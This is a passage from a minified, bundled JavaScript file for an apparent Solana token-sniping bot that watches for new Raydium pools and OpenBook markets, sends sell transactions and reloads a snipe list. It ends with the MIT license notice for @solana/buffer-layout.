X.getLatestBlockhash({commitment:ae}),N=new G.TransactionMessage({payerKey:F.publicKey,recentBlockhash:k.blockhash,instructions:[G.ComputeBudgetProgram.setComputeUnitPrice({microLamports:4e5}),G.ComputeBudgetProgram.setComputeUnitLimit({units:2e5}),...S.instructions,(0,ue.createCloseAccountInstruction)(l.address,F.publicKey,F.publicKey)]}).compileToV0Message(),W=new G.VersionedTransaction(N);W.sign([F,...S.signers]);let V=await X.sendRawTransaction(W.serialize(),{preflightCommitment:ae});A.info({mint:e,signature:V},"Sent SELL TX...");let Z=await X.confirmTransaction({signature:V,lastValidBlockHeight:k.lastValidBlockHeight,blockhash:k.blockhash},ae);if(Z.value.err){A.debug(Z.value.err),A.info({mint:e,signature:V},"Error confirming sell tx");continue}return A.info({mint:e,signature:V,url:`https://solscan.io/tx/${V}?cluster=${fn}`,dex:`https://dexscreener.com/solana/${e}?maker=${F.publicKey}`},`Confirmed sell tx... Sold at: ${o}	Net Profit: ${b*100}%`),!0}catch(l){s++,A.debug(l),A.error({mint:e},`Failed to sell token, retry: ${s}/${an}`)}while(s<an);return!0}function Sn(){if(!dt)return;let r=Re.length;Re=un.readFileSync(ln.join(__dirname,"snipedlist.txt"),"utf-8").split(`
`).map(t=>t.trim()).filter(t=>t),Re.length!=r&&A.info(`Loaded snipe list: ${Re.length}`)}function Jn(r){return dt?Re.includes(r):!0}var er=async()=>{try{await Hn(),console.log("Authentication successful."),await Qn()}catch(o){o instanceof Error?console.error(o.message):console.error("An unknown error occurred."),process.exit(1)}let r=Math.floor(new Date().getTime()/1e3),e=X.onProgramAccountChange(ut,async o=>{let s=o.accountId.toString(),l=B.LIQUIDITY_STATE_LAYOUT_V4.decode(o.accountInfo.data),b=parseInt(l.poolOpenTime.toString()),S=on.has(s);if(b>r&&!S){on.add(s);let k=wn(o.accountId,l)}},ae,[{dataSize:B.LIQUIDITY_STATE_LAYOUT_V4.span},{memcmp:{offset:B.LIQUIDITY_STATE_LAYOUT_V4.offsetOf("quoteMint"),bytes:C.mint.toBase58()}},{memcmp:{offset:B.LIQUIDITY_STATE_LAYOUT_V4.offsetOf("marketProgramId"),bytes:Lt.toBase58()}},{memcmp:{offset:B.LIQUIDITY_STATE_LAYOUT_V4.offsetOf("status"),bytes:_t.default.encode([6,0,0,0,0,0,0,0])}}]),t=X.onProgramAccountChange(Lt,async o=>{let s=o.accountId.toString();if(!sn.has(s)){sn.add(s);let b=En(o)}},ae,[{dataSize:B.MARKET_STATE_LAYOUT_V3.span},{memcmp:{offset:B.MARKET_STATE_LAYOUT_V3.offsetOf("quoteMint"),bytes:C.mint.toBase58()}}]);if(yn){let o=X.onProgramAccountChange(ue.TOKEN_PROGRAM_ID,async s=>{let l=ue.AccountLayout.decode(s.accountInfo.data);if(s.accountId.equals(ft))return;let b=!1;for(;!b;){setTimeout(()=>{},1e3);let S=await nn(l.mint.toBase58());S&&(A.info(l.mint,`Current Price: ${S} SOL`),b=await Zn(s.accountId,l.mint,l.amount,S))}},ae,[{dataSize:165},{memcmp:{offset:32,bytes:F.publicKey.toBase58()}}])}A.info("-------------------- SEARCH NEW POOLS --------------------"),dt&&setInterval(Sn,Gn)};er();0&&(module.exports={checkMintable,processOpenBookMarket,processRaydiumPool});
/*! Bundled license information:

@solana/buffer-layout/lib/Layout.js:
  (**
   * Support for translating between Uint8Array instances and JavaScript
   * native types.
   *
   * {@link module:Layout~Layout|Layout} is the basis of a class
   * hierarchy that associates property names with sequences of encoded
   * bytes.
   *
   * Layouts are supported for these scalar (numeric) types:
   * * {@link module:Layout~UInt|Unsigned integers in little-endian
   *   format} with {@link module:Layout.u8|8-bit}, {@link
   *   module:Layout.u16|16-bit}, {@link module:Layout.u24|24-bit},
   *   {@link module:Layout.u32|32-bit}, {@link
   *   module:Layout.u40|40-bit}, and {@link module:Layout.u48|48-bit}
   *   representation ranges;
   * * {@link module:Layout~UIntBE|Unsigned integers in big-endian
   *   format} with {@link module:Layout.u16be|16-bit}, {@link
   *   module:Layout.u24be|24-bit}, {@link module:Layout.u32be|32-bit},
   *   {@link module:Layout.u40be|40-bit}, and {@link
   *   module:Layout.u48be|48-bit} representation ranges;
   * * {@link module:Layout~Int|Signed integers in little-endian
   *   format} with {@link module:Layout.s8|8-bit}, {@link
   *   module:Layout.s16|16-bit}, {@link module:Layout.s24|24-bit},
   *   {@link module:Layout.s32|32-bit}, {@link
   *   module:Layout.s40|40-bit}, and {@link module:Layout.s48|48-bit}
   *   representation ranges;
   * * {@link module:Layout~IntBE|Signed integers in big-endian format}
   *   with {@link module:Layout.s16be|16-bit}, {@link
   *   module:Layout.s24be|24-bit}, {@link module:Layout.s32be|32-bit},
   *   {@link module:Layout.s40be|40-bit}, and {@link
   *   module:Layout.s48be|48-bit} representation ranges;
   * * 64-bit integral values that decode to an exact (if magnitude is
   *   less than 2^53) or nearby integral Number in {@link
   *   module:Layout.nu64|unsigned little-endian}, {@link
   *   module:Layout.nu64be|unsigned big-endian}, {@link
   *   module:Layout.ns64|signed little-endian}, and {@link
   *   module:Layout.ns64be|unsigned big-endian} encodings;
   * * 32-bit floating point values with {@link
   *   module:Layout.f32|little-endian} and {@link
   *   module:Layout.f32be|big-endian} representations;
   * * 64-bit floating point values with {@link
   *   module:Layout.f64|little-endian} and {@link
   *   module:Layout.f64be|big-endian} representations;
   * * {@link module:Layout.const|Constants} that take no space in the
   *   encoded expression.
   *
   * and for these aggregate types:
   * * {@link module:Layout.seq|Sequence}s of instances of a {@link
   *   module:Layout~Layout|Layout}, with JavaScript representation as
   *   an Array and constant or data-dependent {@link
   *   module:Layout~Sequence#count|length};
   * * {@link module:Layout.struct|Structure}s that aggregate a
   *   heterogeneous sequence of {@link module:Layout~Layout|Layout}
   *   instances, with JavaScript representation as an Object;
   * * {@link module:Layout.union|Union}s that support multiple {@link
   *   module:Layout~VariantLayout|variant layouts} over a fixed
   *   (padded) or variable (not padded) span of bytes, using an
   *   unsigned integer at the start of the data or a separate {@link
   *   module:Layout.unionLayoutDiscriminator|layout element} to
   *   determine which layout to use when interpreting the buffer
   *   contents;
   * * {@link module:Layout.bits|BitStructure}s that contain a sequence
   *   of individual {@link
   *   module:Layout~BitStructure#addField|BitField}s packed into an 8,
   *   16, 24, or 32-bit unsigned integer starting at the least- or
   *   most-significant bit;
   * * {@link module:Layout.cstr|C strings} of varying length;
   * * {@link module:Layout.blob|Blobs} of fixed- or variable-{@link
   *   module:Layout~Blob#length|length} raw data.
   *
   * All {@link module:Layout~Layout|Layout} instances are immutable
   * after construction, to prevent internal state from becoming
   * inconsistent.
   *
   * @local Layout
   * @local ExternalLayout
   * @local GreedyCount
   * @local OffsetLayout
   * @local UInt
   * @local UIntBE
   * @local Int
   * @local IntBE
   * @local NearUInt64
   * @local NearUInt64BE
   * @local NearInt64
   * @local NearInt64BE
   * @local Float
   * @local FloatBE
   * @local Double
   * @local DoubleBE
   * @local Sequence
   * @local Structure
   * @local UnionDiscriminator
   * @local UnionLayoutDiscriminator
   * @local Union
   * @local VariantLayout
   * @local BitStructure
   * @local BitField
   * @local Boolean
   * @local Blob
   * @local CString
   * @local Constant
   * @local bindConstructorLayout
   * @module Layout
   * @license MIT
   * @author Peter A. Bigot
   * @see {@link https://github.com/pabigot/buffer-layout|buffer-layout on GitHub}
   *)
*/
